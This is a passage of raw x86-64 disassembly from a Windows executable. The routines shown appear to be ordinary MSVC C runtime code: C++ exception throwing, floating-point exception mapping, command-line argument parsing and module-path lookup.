   140004126:	cc                   	int3
   140004127:	cc                   	int3
   140004128:	cc                   	int3
   140004129:	cc                   	int3
   14000412a:	cc                   	int3
   14000412b:	cc                   	int3
   14000412c:	cc                   	int3
   14000412d:	cc                   	int3
   14000412e:	cc                   	int3
   14000412f:	cc                   	int3
   140004130:	cc                   	int3
   140004131:	cc                   	int3
   140004132:	cc                   	int3
   140004133:	cc                   	int3
   140004134:	cc                   	int3
   140004135:	cc                   	int3
   140004136:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000413d:	00 00 00 
   140004140:	cc                   	int3
   140004141:	cc                   	int3
   140004142:	cc                   	int3
   140004143:	cc                   	int3
   140004144:	cc                   	int3
   140004145:	cc                   	int3
   140004146:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000414d:	00 00 00 
   140004150:	cc                   	int3
   140004151:	cc                   	int3
   140004152:	cc                   	int3
   140004153:	cc                   	int3
   140004154:	cc                   	int3
   140004155:	cc                   	int3
   140004156:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000415d:	00 00 00 
   140004160:	cc                   	int3
   140004161:	cc                   	int3
   140004162:	cc                   	int3
   140004163:	cc                   	int3
   140004164:	cc                   	int3
   140004165:	cc                   	int3
   140004166:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000416d:	00 00 00 
   140004170:	48 83 ec 28          	sub    $0x28,%rsp
   140004174:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140004179:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   14000417e:	44 89 44 24 40       	mov    %r8d,0x40(%rsp)
   140004183:	48 8b 12             	mov    (%rdx),%rdx
   140004186:	48 8b c1             	mov    %rcx,%rax
   140004189:	e8 12 de ff ff       	call   0x140001fa0
   14000418e:	ff d0                	call   *%rax
   140004190:	e8 3b de ff ff       	call   0x140001fd0
   140004195:	48 8b c8             	mov    %rax,%rcx
   140004198:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   14000419d:	48 8b 12             	mov    (%rdx),%rdx
   1400041a0:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1400041a6:	e8 f5 dd ff ff       	call   0x140001fa0
   1400041ab:	48 83 c4 28          	add    $0x28,%rsp
   1400041af:	c3                   	ret
   1400041b0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400041b5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400041ba:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   1400041bf:	41 56                	push   %r14
   1400041c1:	48 83 ec 20          	sub    $0x20,%rsp
   1400041c5:	80 79 08 00          	cmpb   $0x0,0x8(%rcx)
   1400041c9:	4c 8b f2             	mov    %rdx,%r14
   1400041cc:	48 8b f1             	mov    %rcx,%rsi
   1400041cf:	74 4c                	je     0x14000421d
   1400041d1:	48 8b 01             	mov    (%rcx),%rax
   1400041d4:	48 85 c0             	test   %rax,%rax
   1400041d7:	74 44                	je     0x14000421d
   1400041d9:	48 83 cf ff          	or     $0xffffffffffffffff,%rdi
   1400041dd:	48 ff c7             	inc    %rdi
   1400041e0:	80 3c 38 00          	cmpb   $0x0,(%rax,%rdi,1)
   1400041e4:	75 f7                	jne    0x1400041dd
   1400041e6:	48 8d 4f 01          	lea    0x1(%rdi),%rcx
   1400041ea:	e8 71 14 00 00       	call   0x140005660
   1400041ef:	48 8b d8             	mov    %rax,%rbx
   1400041f2:	48 85 c0             	test   %rax,%rax
   1400041f5:	74 1c                	je     0x140004213
   1400041f7:	4c 8b 06             	mov    (%rsi),%r8
   1400041fa:	48 8d 57 01          	lea    0x1(%rdi),%rdx
   1400041fe:	48 8b c8             	mov    %rax,%rcx
   140004201:	e8 62 14 00 00       	call   0x140005668
   140004206:	48 8b c3             	mov    %rbx,%rax
   140004209:	41 c6 46 08 01       	movb   $0x1,0x8(%r14)
   14000420e:	49 89 06             	mov    %rax,(%r14)
   140004211:	33 db                	xor    %ebx,%ebx
   140004213:	48 8b cb             	mov    %rbx,%rcx
   140004216:	e8 31 14 00 00       	call   0x14000564c
   14000421b:	eb 0a                	jmp    0x140004227
   14000421d:	48 8b 01             	mov    (%rcx),%rax
   140004220:	48 89 02             	mov    %rax,(%rdx)
   140004223:	c6 42 08 00          	movb   $0x0,0x8(%rdx)
   140004227:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000422c:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140004231:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140004236:	48 83 c4 20          	add    $0x20,%rsp
   14000423a:	41 5e                	pop    %r14
   14000423c:	c3                   	ret
   14000423d:	cc                   	int3
   14000423e:	cc                   	int3
   14000423f:	cc                   	int3
   140004240:	40 53                	rex push %rbx
   140004242:	48 83 ec 20          	sub    $0x20,%rsp
   140004246:	80 79 08 00          	cmpb   $0x0,0x8(%rcx)
   14000424a:	48 8b d9             	mov    %rcx,%rbx
   14000424d:	74 08                	je     0x140004257
   14000424f:	48 8b 09             	mov    (%rcx),%rcx
   140004252:	e8 f5 13 00 00       	call   0x14000564c
   140004257:	48 83 23 00          	andq   $0x0,(%rbx)
   14000425b:	c6 43 08 00          	movb   $0x0,0x8(%rbx)
   14000425f:	48 83 c4 20          	add    $0x20,%rsp
   140004263:	5b                   	pop    %rbx
   140004264:	c3                   	ret
   140004265:	cc                   	int3
   140004266:	cc                   	int3
   140004267:	cc                   	int3
   140004268:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   14000426d:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140004272:	57                   	push   %rdi
   140004273:	48 83 ec 50          	sub    $0x50,%rsp
   140004277:	48 8b da             	mov    %rdx,%rbx
   14000427a:	48 8b f1             	mov    %rcx,%rsi
   14000427d:	bf 20 05 93 19       	mov    $0x19930520,%edi
   140004282:	48 85 d2             	test   %rdx,%rdx
   140004285:	74 1d                	je     0x1400042a4
   140004287:	f6 02 10             	testb  $0x10,(%rdx)
   14000428a:	74 18                	je     0x1400042a4
   14000428c:	48 8b 09             	mov    (%rcx),%rcx
   14000428f:	48 83 e9 08          	sub    $0x8,%rcx
   140004293:	48 8b 01             	mov    (%rcx),%rax
   140004296:	48 8b 58 30          	mov    0x30(%rax),%rbx
   14000429a:	48 8b 40 40          	mov    0x40(%rax),%rax
   14000429e:	ff 15 bc 9f 00 00    	call   *0x9fbc(%rip)        # 0x14000e260
   1400042a4:	33 c0                	xor    %eax,%eax
   1400042a6:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400042ab:	48 85 db             	test   %rbx,%rbx
   1400042ae:	74 22                	je     0x1400042d2
   1400042b0:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400042b5:	48 8b cb             	mov    %rbx,%rcx
   1400042b8:	ff 15 4a 9e 00 00    	call   *0x9e4a(%rip)        # 0x14000e108
   1400042be:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400042c3:	f6 03 08             	testb  $0x8,(%rbx)
   1400042c6:	75 05                	jne    0x1400042cd
   1400042c8:	48 85 c0             	test   %rax,%rax
   1400042cb:	75 05                	jne    0x1400042d2
   1400042cd:	bf 00 40 99 01       	mov    $0x1994000,%edi
   1400042d2:	ba 01 00 00 00       	mov    $0x1,%edx
   1400042d7:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   1400042dc:	4c 8d 4c 24 28       	lea    0x28(%rsp),%r9
   1400042e1:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   1400042e6:	b9 63 73 6d e0       	mov    $0xe06d7363,%ecx
   1400042eb:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   1400042f0:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400042f5:	44 8d 42 03          	lea    0x3(%rdx),%r8d
   1400042f9:	ff 15 01 9e 00 00    	call   *0x9e01(%rip)        # 0x14000e100
   1400042ff:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   140004304:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   140004309:	48 83 c4 50          	add    $0x50,%rsp
   14000430d:	5f                   	pop    %rdi
   14000430e:	c3                   	ret
   14000430f:	cc                   	int3
   140004310:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004315:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000431a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000431f:	57                   	push   %rdi
   140004320:	48 83 ec 20          	sub    $0x20,%rsp
   140004324:	48 8b f2             	mov    %rdx,%rsi
   140004327:	8b f9                	mov    %ecx,%edi
   140004329:	e8 9e 1a 00 00       	call   0x140005dcc
   14000432e:	45 33 c9             	xor    %r9d,%r9d
   140004331:	48 8b d8             	mov    %rax,%rbx
   140004334:	48 85 c0             	test   %rax,%rax
   140004337:	74 1f                	je     0x140004358
   140004339:	48 8b 08             	mov    (%rax),%rcx
   14000433c:	48 8b c1             	mov    %rcx,%rax
   14000433f:	4c 8d 81 c0 00 00 00 	lea    0xc0(%rcx),%r8
   140004346:	49 3b c8             	cmp    %r8,%rcx
   140004349:	74 0d                	je     0x140004358
   14000434b:	39 38                	cmp    %edi,(%rax)
   14000434d:	74 20                	je     0x14000436f
   14000434f:	48 83 c0 10          	add    $0x10,%rax
   140004353:	49 3b c0             	cmp    %r8,%rax
   140004356:	75 f3                	jne    0x14000434b
   140004358:	33 c0                	xor    %eax,%eax
   14000435a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000435f:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140004364:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140004369:	48 83 c4 20          	add    $0x20,%rsp
   14000436d:	5f                   	pop    %rdi
   14000436e:	c3                   	ret
   14000436f:	48 85 c0             	test   %rax,%rax
   140004372:	74 e4                	je     0x140004358
   140004374:	4c 8b 40 08          	mov    0x8(%rax),%r8
   140004378:	4d 85 c0             	test   %r8,%r8
   14000437b:	74 db                	je     0x140004358
   14000437d:	49 83 f8 05          	cmp    $0x5,%r8
   140004381:	75 0a                	jne    0x14000438d
   140004383:	4c 89 48 08          	mov    %r9,0x8(%rax)
   140004387:	41 8d 40 fc          	lea    -0x4(%r8),%eax
   14000438b:	eb cd                	jmp    0x14000435a
   14000438d:	49 83 f8 01          	cmp    $0x1,%r8
   140004391:	75 05                	jne    0x140004398
   140004393:	83 c8 ff             	or     $0xffffffff,%eax
   140004396:	eb c2                	jmp    0x14000435a
   140004398:	48 8b 6b 08          	mov    0x8(%rbx),%rbp
   14000439c:	48 89 73 08          	mov    %rsi,0x8(%rbx)
   1400043a0:	83 78 04 08          	cmpl   $0x8,0x4(%rax)
   1400043a4:	0f 85 c4 00 00 00    	jne    0x14000446e
   1400043aa:	48 83 c1 30          	add    $0x30,%rcx
   1400043ae:	48 8d 91 90 00 00 00 	lea    0x90(%rcx),%rdx
   1400043b5:	eb 08                	jmp    0x1400043bf
   1400043b7:	4c 89 49 08          	mov    %r9,0x8(%rcx)
   1400043bb:	48 83 c1 10          	add    $0x10,%rcx
   1400043bf:	48 3b ca             	cmp    %rdx,%rcx
   1400043c2:	75 f3                	jne    0x1400043b7
   1400043c4:	81 38 8d 00 00 c0    	cmpl   $0xc000008d,(%rax)
   1400043ca:	8b 7b 10             	mov    0x10(%rbx),%edi
   1400043cd:	74 7a                	je     0x140004449
   1400043cf:	81 38 8e 00 00 c0    	cmpl   $0xc000008e,(%rax)
   1400043d5:	74 6b                	je     0x140004442
   1400043d7:	81 38 8f 00 00 c0    	cmpl   $0xc000008f,(%rax)
   1400043dd:	74 5c                	je     0x14000443b
   1400043df:	81 38 90 00 00 c0    	cmpl   $0xc0000090,(%rax)
   1400043e5:	74 4d                	je     0x140004434
   1400043e7:	81 38 91 00 00 c0    	cmpl   $0xc0000091,(%rax)
   1400043ed:	74 3e                	je     0x14000442d
   1400043ef:	81 38 92 00 00 c0    	cmpl   $0xc0000092,(%rax)
   1400043f5:	74 2f                	je     0x140004426
   1400043f7:	81 38 93 00 00 c0    	cmpl   $0xc0000093,(%rax)
   1400043fd:	74 20                	je     0x14000441f
   1400043ff:	81 38 b4 02 00 c0    	cmpl   $0xc00002b4,(%rax)
   140004405:	74 11                	je     0x140004418
   140004407:	81 38 b5 02 00 c0    	cmpl   $0xc00002b5,(%rax)
   14000440d:	8b d7                	mov    %edi,%edx
   14000440f:	75 40                	jne    0x140004451
   140004411:	ba 8d 00 00 00       	mov    $0x8d,%edx
   140004416:	eb 36                	jmp    0x14000444e
   140004418:	ba 8e 00 00 00       	mov    $0x8e,%edx
   14000441d:	eb 2f                	jmp    0x14000444e
   14000441f:	ba 85 00 00 00       	mov    $0x85,%edx
   140004424:	eb 28                	jmp    0x14000444e
   140004426:	ba 8a 00 00 00       	mov    $0x8a,%edx
   14000442b:	eb 21                	jmp    0x14000444e
   14000442d:	ba 84 00 00 00       	mov    $0x84,%edx
   140004432:	eb 1a                	jmp    0x14000444e
   140004434:	ba 81 00 00 00       	mov    $0x81,%edx
   140004439:	eb 13                	jmp    0x14000444e
   14000443b:	ba 86 00 00 00       	mov    $0x86,%edx
   140004440:	eb 0c                	jmp    0x14000444e
   140004442:	ba 83 00 00 00       	mov    $0x83,%edx
   140004447:	eb 05                	jmp    0x14000444e
   140004449:	ba 82 00 00 00       	mov    $0x82,%edx
   14000444e:	89 53 10             	mov    %edx,0x10(%rbx)
   140004451:	49 ba 70 33 d3 30 4f 	movabs $0x8b9c1f4f30d33370,%r10
   140004458:	1f 9c 8b 
   14000445b:	b9 08 00 00 00       	mov    $0x8,%ecx
   140004460:	49 8b c0             	mov    %r8,%rax
   140004463:	ff 15 ff 9d 00 00    	call   *0x9dff(%rip)        # 0x14000e268
   140004469:	89 7b 10             	mov    %edi,0x10(%rbx)
   14000446c:	eb 1a                	jmp    0x140004488
   14000446e:	4c 89 48 08          	mov    %r9,0x8(%rax)
   140004472:	49 ba 70 73 d7 50 49 	movabs $0xc6c1864950d77370,%r10
   140004479:	86 c1 c6 
   14000447c:	8b 48 04             	mov    0x4(%rax),%ecx
   14000447f:	49 8b c0             	mov    %r8,%rax
   140004482:	ff 15 e0 9d 00 00    	call   *0x9de0(%rip)        # 0x14000e268
   140004488:	48 89 6b 08          	mov    %rbp,0x8(%rbx)
   14000448c:	e9 02 ff ff ff       	jmp    0x140004393
   140004491:	cc                   	int3
   140004492:	cc                   	int3
   140004493:	cc                   	int3
   140004494:	8b 05 26 48 01 00    	mov    0x14826(%rip),%eax        # 0x140018cc0
   14000449a:	c3                   	ret
   14000449b:	cc                   	int3
   14000449c:	89 0d 1e 48 01 00    	mov    %ecx,0x1481e(%rip)        # 0x140018cc0
   1400044a2:	c3                   	ret
   1400044a3:	cc                   	int3
   1400044a4:	48 8b 15 95 3b 01 00 	mov    0x13b95(%rip),%rdx        # 0x140018040
   1400044ab:	8b ca                	mov    %edx,%ecx
   1400044ad:	48 33 15 14 48 01 00 	xor    0x14814(%rip),%rdx        # 0x140018cc8
   1400044b4:	83 e1 3f             	and    $0x3f,%ecx
   1400044b7:	48 d3 ca             	ror    %cl,%rdx
   1400044ba:	48 85 d2             	test   %rdx,%rdx
   1400044bd:	0f 95 c0             	setne  %al
   1400044c0:	c3                   	ret
   1400044c1:	cc                   	int3
   1400044c2:	cc                   	int3
   1400044c3:	cc                   	int3
   1400044c4:	48 89 0d fd 47 01 00 	mov    %rcx,0x147fd(%rip)        # 0x140018cc8
   1400044cb:	c3                   	ret
   1400044cc:	48 8b 15 6d 3b 01 00 	mov    0x13b6d(%rip),%rdx        # 0x140018040
   1400044d3:	4c 8b c1             	mov    %rcx,%r8
   1400044d6:	8b ca                	mov    %edx,%ecx
   1400044d8:	48 33 15 e9 47 01 00 	xor    0x147e9(%rip),%rdx        # 0x140018cc8
   1400044df:	83 e1 3f             	and    $0x3f,%ecx
   1400044e2:	48 d3 ca             	ror    %cl,%rdx
   1400044e5:	48 85 d2             	test   %rdx,%rdx
   1400044e8:	75 03                	jne    0x1400044ed
   1400044ea:	33 c0                	xor    %eax,%eax
   1400044ec:	c3                   	ret
   1400044ed:	49 ba 70 71 54 58 e6 	movabs $0xd88807e658547170,%r10
   1400044f4:	07 88 d8 
   1400044f7:	49 8b c8             	mov    %r8,%rcx
   1400044fa:	48 8b c2             	mov    %rdx,%rax
   1400044fd:	48 ff 25 64 9d 00 00 	rex.W jmp *0x9d64(%rip)        # 0x14000e268
   140004504:	4c 8b 05 35 3b 01 00 	mov    0x13b35(%rip),%r8        # 0x140018040
   14000450b:	4c 8b c9             	mov    %rcx,%r9
   14000450e:	41 8b d0             	mov    %r8d,%edx
   140004511:	b9 40 00 00 00       	mov    $0x40,%ecx
   140004516:	83 e2 3f             	and    $0x3f,%edx
   140004519:	2b ca                	sub    %edx,%ecx
   14000451b:	49 d3 c9             	ror    %cl,%r9
   14000451e:	4d 33 c8             	xor    %r8,%r9
   140004521:	4c 89 0d a0 47 01 00 	mov    %r9,0x147a0(%rip)        # 0x140018cc8
   140004528:	c3                   	ret
   140004529:	cc                   	int3
   14000452a:	cc                   	int3
   14000452b:	cc                   	int3
   14000452c:	48 8b c4             	mov    %rsp,%rax
   14000452f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140004533:	48 89 70 10          	mov    %rsi,0x10(%rax)
   140004537:	48 89 78 18          	mov    %rdi,0x18(%rax)
   14000453b:	4c 89 70 20          	mov    %r14,0x20(%rax)
   14000453f:	41 57                	push   %r15
   140004541:	4c 8b 5c 24 30       	mov    0x30(%rsp),%r11
   140004546:	33 f6                	xor    %esi,%esi
   140004548:	49 8b d9             	mov    %r9,%rbx
   14000454b:	49 89 33             	mov    %rsi,(%r11)
   14000454e:	49 c7 01 01 00 00 00 	movq   $0x1,(%r9)
   140004555:	48 85 d2             	test   %rdx,%rdx
   140004558:	74 07                	je     0x140004561
   14000455a:	4c 89 02             	mov    %r8,(%rdx)
   14000455d:	48 83 c2 08          	add    $0x8,%rdx
   140004561:	44 8a ce             	mov    %sil,%r9b
   140004564:	41 bf 22 00 00 00    	mov    $0x22,%r15d
   14000456a:	4c 8b d1             	mov    %rcx,%r10
   14000456d:	66 44 39 39          	cmp    %r15w,(%rcx)
   140004571:	75 11                	jne    0x140004584
   140004573:	45 84 c9             	test   %r9b,%r9b
   140004576:	41 0f b7 c7          	movzwl %r15w,%eax
   14000457a:	41 0f 94 c1          	sete   %r9b
   14000457e:	48 83 c1 02          	add    $0x2,%rcx
   140004582:	eb 1f                	jmp    0x1400045a3
   140004584:	49 ff 03             	incq   (%r11)
   140004587:	4d 85 c0             	test   %r8,%r8
   14000458a:	74 0b                	je     0x140004597
   14000458c:	0f b7 01             	movzwl (%rcx),%eax
   14000458f:	66 41 89 00          	mov    %ax,(%r8)
   140004593:	49 83 c0 02          	add    $0x2,%r8
   140004597:	0f b7 01             	movzwl (%rcx),%eax
   14000459a:	48 83 c1 02          	add    $0x2,%rcx
   14000459e:	66 85 c0             	test   %ax,%ax
   1400045a1:	74 1d                	je     0x1400045c0
   1400045a3:	45 84 c9             	test   %r9b,%r9b
   1400045a6:	75 c2                	jne    0x14000456a
   1400045a8:	66 83 f8 20          	cmp    $0x20,%ax
   1400045ac:	74 06                	je     0x1400045b4
   1400045ae:	66 83 f8 09          	cmp    $0x9,%ax
   1400045b2:	75 b6                	jne    0x14000456a
   1400045b4:	4d 85 c0             	test   %r8,%r8
   1400045b7:	74 0a                	je     0x1400045c3
   1400045b9:	66 41 89 70 fe       	mov    %si,-0x2(%r8)
   1400045be:	eb 03                	jmp    0x1400045c3
   1400045c0:	49 8b ca             	mov    %r10,%rcx
   1400045c3:	40 8a fe             	mov    %sil,%dil
   1400045c6:	41 be 5c 00 00 00    	mov    $0x5c,%r14d
   1400045cc:	0f b7 01             	movzwl (%rcx),%eax
   1400045cf:	66 85 c0             	test   %ax,%ax
   1400045d2:	0f 84 d4 00 00 00    	je     0x1400046ac
   1400045d8:	66 83 f8 20          	cmp    $0x20,%ax
   1400045dc:	74 06                	je     0x1400045e4
   1400045de:	66 83 f8 09          	cmp    $0x9,%ax
   1400045e2:	75 09                	jne    0x1400045ed
   1400045e4:	48 83 c1 02          	add    $0x2,%rcx
   1400045e8:	0f b7 01             	movzwl (%rcx),%eax
   1400045eb:	eb eb                	jmp    0x1400045d8
   1400045ed:	66 85 c0             	test   %ax,%ax
   1400045f0:	0f 84 b6 00 00 00    	je     0x1400046ac
   1400045f6:	48 85 d2             	test   %rdx,%rdx
   1400045f9:	74 07                	je     0x140004602
   1400045fb:	4c 89 02             	mov    %r8,(%rdx)
   1400045fe:	48 83 c2 08          	add    $0x8,%rdx
   140004602:	48 ff 03             	incq   (%rbx)
   140004605:	41 ba 01 00 00 00    	mov    $0x1,%r10d
   14000460b:	8b c6                	mov    %esi,%eax
   14000460d:	eb 06                	jmp    0x140004615
   14000460f:	48 83 c1 02          	add    $0x2,%rcx
   140004613:	ff c0                	inc    %eax
   140004615:	44 0f b7 09          	movzwl (%rcx),%r9d
   140004619:	66 45 3b ce          	cmp    %r14w,%r9w
   14000461d:	74 f0                	je     0x14000460f
   14000461f:	66 45 3b cf          	cmp    %r15w,%r9w
   140004623:	75 37                	jne    0x14000465c
   140004625:	41 84 c2             	test   %al,%r10b
   140004628:	75 1c                	jne    0x140004646
   14000462a:	40 84 ff             	test   %dil,%dil
   14000462d:	74 0d                	je     0x14000463c
   14000462f:	66 44 39 79 02       	cmp    %r15w,0x2(%rcx)
   140004634:	75 06                	jne    0x14000463c
   140004636:	48 83 c1 02          	add    $0x2,%rcx
   14000463a:	eb 0a                	jmp    0x140004646
   14000463c:	40 84 ff             	test   %dil,%dil
   14000463f:	44 8b d6             	mov    %esi,%r10d
   140004642:	40 0f 94 c7          	sete   %dil
   140004646:	d1 e8                	shr    $1,%eax
   140004648:	eb 12                	jmp    0x14000465c
   14000464a:	ff c8                	dec    %eax
   14000464c:	4d 85 c0             	test   %r8,%r8
   14000464f:	74 08                	je     0x140004659
   140004651:	66 45 89 30          	mov    %r14w,(%r8)
   140004655:	49 83 c0 02          	add    $0x2,%r8
   140004659:	49 ff 03             	incq   (%r11)
   14000465c:	85 c0                	test   %eax,%eax
   14000465e:	75 ea                	jne    0x14000464a
   140004660:	0f b7 01             	movzwl (%rcx),%eax
   140004663:	66 85 c0             	test   %ax,%ax
   140004666:	74 2f                	je     0x140004697
   140004668:	40 84 ff             	test   %dil,%dil
   14000466b:	75 0c                	jne    0x140004679
   14000466d:	66 83 f8 20          	cmp    $0x20,%ax
   140004671:	74 24                	je     0x140004697
   140004673:	66 83 f8 09          	cmp    $0x9,%ax
   140004677:	74 1e                	je     0x140004697
   140004679:	45 85 d2             	test   %r10d,%r10d
   14000467c:	74 10                	je     0x14000468e
   14000467e:	4d 85 c0             	test   %r8,%r8
   140004681:	74 08                	je     0x14000468b
   140004683:	66 41 89 00          	mov    %ax,(%r8)
   140004687:	49 83 c0 02          	add    $0x2,%r8
   14000468b:	49 ff 03             	incq   (%r11)
   14000468e:	48 83 c1 02          	add    $0x2,%rcx
   140004692:	e9 6e ff ff ff       	jmp    0x140004605
   140004697:	4d 85 c0             	test   %r8,%r8
   14000469a:	74 08                	je     0x1400046a4
   14000469c:	66 41 89 30          	mov    %si,(%r8)
   1400046a0:	49 83 c0 02          	add    $0x2,%r8
   1400046a4:	49 ff 03             	incq   (%r11)
   1400046a7:	e9 20 ff ff ff       	jmp    0x1400045cc
   1400046ac:	48 85 d2             	test   %rdx,%rdx
   1400046af:	74 03                	je     0x1400046b4
   1400046b1:	48 89 32             	mov    %rsi,(%rdx)
   1400046b4:	48 ff 03             	incq   (%rbx)
   1400046b7:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   1400046bc:	48 8b 74 24 18       	mov    0x18(%rsp),%rsi
   1400046c1:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   1400046c6:	4c 8b 74 24 28       	mov    0x28(%rsp),%r14
   1400046cb:	41 5f                	pop    %r15
   1400046cd:	c3                   	ret
   1400046ce:	cc                   	int3
   1400046cf:	cc                   	int3
   1400046d0:	40 53                	rex push %rbx
   1400046d2:	48 83 ec 20          	sub    $0x20,%rsp
   1400046d6:	48 b8 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rax
   1400046dd:	ff ff 1f 
   1400046e0:	4c 8b ca             	mov    %rdx,%r9
   1400046e3:	48 3b c8             	cmp    %rax,%rcx
   1400046e6:	73 3d                	jae    0x140004725
   1400046e8:	33 d2                	xor    %edx,%edx
   1400046ea:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   1400046ee:	49 f7 f0             	div    %r8
   1400046f1:	4c 3b c8             	cmp    %rax,%r9
   1400046f4:	73 2f                	jae    0x140004725
   1400046f6:	48 c1 e1 03          	shl    $0x3,%rcx
   1400046fa:	4d 0f af c8          	imul   %r8,%r9
   1400046fe:	48 8b c1             	mov    %rcx,%rax
   140004701:	48 f7 d0             	not    %rax
   140004704:	49 3b c1             	cmp    %r9,%rax
   140004707:	76 1c                	jbe    0x140004725
   140004709:	49 03 c9             	add    %r9,%rcx
   14000470c:	ba 01 00 00 00       	mov    $0x1,%edx
   140004711:	e8 9e 1e 00 00       	call   0x1400065b4
   140004716:	33 c9                	xor    %ecx,%ecx
   140004718:	48 8b d8             	mov    %rax,%rbx
   14000471b:	e8 0c 1f 00 00       	call   0x14000662c
   140004720:	48 8b c3             	mov    %rbx,%rax
   140004723:	eb 02                	jmp    0x140004727
   140004725:	33 c0                	xor    %eax,%eax
   140004727:	48 83 c4 20          	add    $0x20,%rsp
   14000472b:	5b                   	pop    %rbx
   14000472c:	c3                   	ret
   14000472d:	cc                   	int3
   14000472e:	cc                   	int3
   14000472f:	cc                   	int3
   140004730:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004735:	55                   	push   %rbp
   140004736:	56                   	push   %rsi
   140004737:	57                   	push   %rdi
   140004738:	41 56                	push   %r14
   14000473a:	41 57                	push   %r15
   14000473c:	48 8b ec             	mov    %rsp,%rbp
   14000473f:	48 83 ec 30          	sub    $0x30,%rsp
   140004743:	33 ff                	xor    %edi,%edi
   140004745:	44 8b f1             	mov    %ecx,%r14d
   140004748:	85 c9                	test   %ecx,%ecx
   14000474a:	0f 84 4f 01 00 00    	je     0x14000489f
   140004750:	8d 41 ff             	lea    -0x1(%rcx),%eax
   140004753:	83 f8 01             	cmp    $0x1,%eax
   140004756:	76 16                	jbe    0x14000476e
   140004758:	e8 37 1e 00 00       	call   0x140006594
   14000475d:	8d 5f 16             	lea    0x16(%rdi),%ebx
   140004760:	89 18                	mov    %ebx,(%rax)
   140004762:	e8 d5 1b 00 00       	call   0x14000633c
   140004767:	8b fb                	mov    %ebx,%edi
   140004769:	e9 31 01 00 00       	jmp    0x14000489f
   14000476e:	48 8d 1d 5b 45 01 00 	lea    0x1455b(%rip),%rbx        # 0x140018cd0
   140004775:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   14000477b:	48 8b d3             	mov    %rbx,%rdx
   14000477e:	33 c9                	xor    %ecx,%ecx
   140004780:	ff 15 9a 99 00 00    	call   *0x999a(%rip)        # 0x14000e120
   140004786:	48 8b 35 13 48 01 00 	mov    0x14813(%rip),%rsi        # 0x140018fa0
   14000478d:	48 89 1d e4 47 01 00 	mov    %rbx,0x147e4(%rip)        # 0x140018f78
   140004794:	48 85 f6             	test   %rsi,%rsi
   140004797:	74 05                	je     0x14000479e
   140004799:	66 39 3e             	cmp    %di,(%rsi)
   14000479c:	75 03                	jne    0x1400047a1
   14000479e:	48 8b f3             	mov    %rbx,%rsi
   1400047a1:	48 8d 45 48          	lea    0x48(%rbp),%rax
   1400047a5:	48 89 7d 40          	mov    %rdi,0x40(%rbp)
   1400047a9:	4c 8d 4d 40          	lea    0x40(%rbp),%r9
   1400047ad:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400047b2:	45 33 c0             	xor    %r8d,%r8d
   1400047b5:	48 89 7d 48          	mov    %rdi,0x48(%rbp)
   1400047b9:	33 d2                	xor    %edx,%edx
   1400047bb:	48 8b ce             	mov    %rsi,%rcx
   1400047be:	e8 69 fd ff ff       	call   0x14000452c
   1400047c3:	4c 8b 7d 40          	mov    0x40(%rbp),%r15
   1400047c7:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1400047cd:	48 8b 55 48          	mov    0x48(%rbp),%rdx
   1400047d1:	49 8b cf             	mov    %r15,%rcx
   1400047d4:	e8 f7 fe ff ff       	call   0x1400046d0
   1400047d9:	48 8b d8             	mov    %rax,%rbx
   1400047dc:	48 85 c0             	test   %rax,%rax
   1400047df:	75 18                	jne    0x1400047f9
   1400047e1:	e8 ae 1d 00 00       	call   0x140006594
   1400047e6:	bb 0c 00 00 00       	mov    $0xc,%ebx
   1400047eb:	33 c9                	xor    %ecx,%ecx
   1400047ed:	89 18                	mov    %ebx,(%rax)
   1400047ef:	e8 38 1e 00 00       	call   0x14000662c
   1400047f4:	e9 6e ff ff ff       	jmp    0x140004767
   1400047f9:	4e 8d 04 f8          	lea    (%rax,%r15,8),%r8
   1400047fd:	48 8b d3             	mov    %rbx,%rdx
   140004800:	48 8d 45 48          	lea    0x48(%rbp),%rax
   140004804:	48 8b ce             	mov    %rsi,%rcx
   140004807:	4c 8d 4d 40          	lea    0x40(%rbp),%r9
   14000480b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004810:	e8 17 fd ff ff       	call   0x14000452c
   140004815:	41 83 fe 01          	cmp    $0x1,%r14d
   140004819:	75 16                	jne    0x140004831
   14000481b:	8b 45 40             	mov    0x40(%rbp),%eax
